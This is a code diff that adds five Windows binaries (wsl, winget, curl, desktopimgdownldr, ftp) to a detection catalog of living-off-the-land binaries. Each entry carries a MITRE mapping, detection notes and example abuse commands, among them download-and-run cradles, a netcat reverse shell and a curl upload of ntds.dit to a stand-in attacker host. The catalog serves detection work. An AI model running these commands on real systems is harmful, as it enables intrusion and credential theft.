@@ -303,6 +303,125 @@ LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
         "severity_weight": 0.78,
         "decode_path": "lolbin_command_decode",
     },
+    # ── Windows 11-era additions ─────────────────────────────────────────────
+    "wsl": {
+        "full_name": "wsl.exe",
+        "mitre_sub_technique": "T1202",
+        "mitre_technique_name": "Indirect Command Execution via WSL",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Subsystem for Linux host binary, present on all Windows 11 systems with WSL enabled. "
+            "Abused to execute Linux binaries and shell commands that evade Windows-native EDR by "
+            "running inside the WSL filesystem namespace: 'wsl -e /bin/bash -c <command>'. "
+            "Provides access to curl, wget, nc, python3, and other Linux tools that are harder to monitor "
+            "than their Windows counterparts."
+        ),
+        "abuse_patterns": [
+            "wsl -e /bin/bash -c 'curl http://attacker/payload -o /tmp/p; chmod +x /tmp/p; /tmp/p'",
+            "wsl -e python3 -c \"import socket; ...\"  # in-process C2 via Linux Python",
+            "wsl --exec nc -e /bin/sh <ip> <port>       # reverse shell via netcat",
+        ],
+        "detection_note": (
+            "wsl.exe spawning bash with network-related child processes (curl, wget, nc) is a critical indicator. "
+            "Monitor wsl.exe child process tree and WSL network connections. "
+            "Legitimate WSL use rarely involves network tools called from parent processes."
+        ),
+        "kill_chain_stage": "execution/lateral_movement",
+        "severity_weight": 0.85,
+        "decode_path": "lolbin_command_decode",
+    },
+    "winget": {
+        "full_name": "winget.exe",
+        "mitre_sub_technique": "T1072",
+        "mitre_technique_name": "Software Deployment Tools Abuse",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows Package Manager, built into Windows 11. Can be abused to install attacker-controlled "
+            "packages or download legitimate remote administration tools: 'winget install <trojanized-pkg>'. "
+            "Can also download and execute portable apps outside traditional installer flows."
+        ),
+        "abuse_patterns": [
+            "winget install --id Publisher.App --silent --accept-source-agreements",
+            "winget install -e --id AnyDesk.AnyDesk --silent  # stealth RAT install",
+        ],
+        "detection_note": (
+            "winget.exe spawned from non-admin user sessions, scheduled tasks, or scripts is suspicious. "
+            "Monitor winget.exe network connections and installed packages post-execution."
+        ),
+        "kill_chain_stage": "installation",
+        "severity_weight": 0.65,
+        "decode_path": "lolbin_command_decode",
+    },
+    "curl": {
+        "full_name": "curl.exe",
+        "mitre_sub_technique": "T1105",
+        "mitre_technique_name": "Ingress Tool Transfer via Built-in curl",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "curl.exe is built into Windows 11 (since 2021) and can transfer files using HTTP/S, FTP, "
+            "and other protocols. Abused as a download cradle: 'curl -o malware.exe http://attacker/payload'. "
+            "Signed by Microsoft, so it bypasses application control policies that only check signatures."
+        ),
+        "abuse_patterns": [
+            "curl -sL https://attacker.example/stage2.exe -o %TEMP%\\s.exe && start %TEMP%\\s.exe",
+            "curl -X POST https://attacker.example/exfil -d @c:\\users\\admin\\ntds.dit",
+        ],
+        "detection_note": (
+            "curl.exe network connections to non-CDN / private IPs are suspicious. "
+            "Look for curl followed by file execution or scheduled task creation."
+        ),
+        "kill_chain_stage": "delivery/exfiltration",
+        "severity_weight": 0.75,
+        "decode_path": "lolbin_command_decode",
+    },
+    "desktopimgdownldr": {
+        "full_name": "desktopimgdownldr.exe",
+        "mitre_sub_technique": "T1105",
+        "mitre_technique_name": "Ingress Tool Transfer via Wallpaper Downloader",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows wallpaper downloader utility abused by setting SYSTEMROOT environment variable "
+            "to redirect downloads to attacker-controlled URLs. "
+            "'desktopimgdownldr /lockscreenurl:https://attacker/payload.exe /eventguid:...' "
+            "downloads the payload disguised as a lock-screen image."
+        ),
+        "abuse_patterns": [
+            "desktopimgdownldr /lockscreenurl:https://attacker.example/payload.exe /eventguid:{GUID}",
+        ],
+        "detection_note": (
+            "desktopimgdownldr.exe with non-Microsoft URLs in /lockscreenurl parameter is a strong indicator. "
+            "This binary has no legitimate non-wallpaper use case."
+        ),
+        "kill_chain_stage": "delivery",
+        "severity_weight": 0.80,
+        "decode_path": "lolbin_command_decode",
+    },
+    "ftp": {
+        "full_name": "ftp.exe",
+        "mitre_sub_technique": "T1105",
+        "mitre_technique_name": "Ingress Tool Transfer via Built-in FTP",
+        "pasta_stage": "Stage4",
+        "pasta_stage_name": "Stage4 — Exploitation & Vulnerability Analysis",
+        "description": (
+            "Windows built-in FTP client present on all Windows versions. "
+            "Abused for file download via command file: ftp -s:commands.txt where commands.txt contains "
+            "GET payload.exe. Also used as a data exfiltration channel bypassing HTTP inspection."
+        ),
+        "abuse_patterns": [
+            "echo open attacker.example> ftp.txt && echo GET payload.exe>> ftp.txt && ftp -s:ftp.txt",
+        ],
+        "detection_note": (
+            "ftp.exe spawned from scripts, cmd, or powershell making outbound connections to non-corporate "
+            "FTP servers is highly suspicious. Legitimate FTP use from endpoints is extremely rare."
+        ),
+        "kill_chain_stage": "delivery/exfiltration",
+        "severity_weight": 0.70,
+        "decode_path": "lolbin_command_decode",
+    },
 }
 
 _LOLBIN_ATTACK_BY_BINARY: Dict[str, List[str]] = {
@@ -319,6 +438,12 @@ _LOLBIN_ATTACK_BY_BINARY: Dict[str, List[str]] = {
     "msiexec": ["T1218.007"],
     "forfiles": ["T1202"],
     "cmd": ["T1059.003"],
+    # Windows 11-era additions
+    "wsl": ["T1202", "T1059.004"],
+    "winget": ["T1072"],
+    "curl": ["T1105", "T1041"],
+    "desktopimgdownldr": ["T1105"],
+    "ftp": ["T1105", "T1041"],
 }
 
 
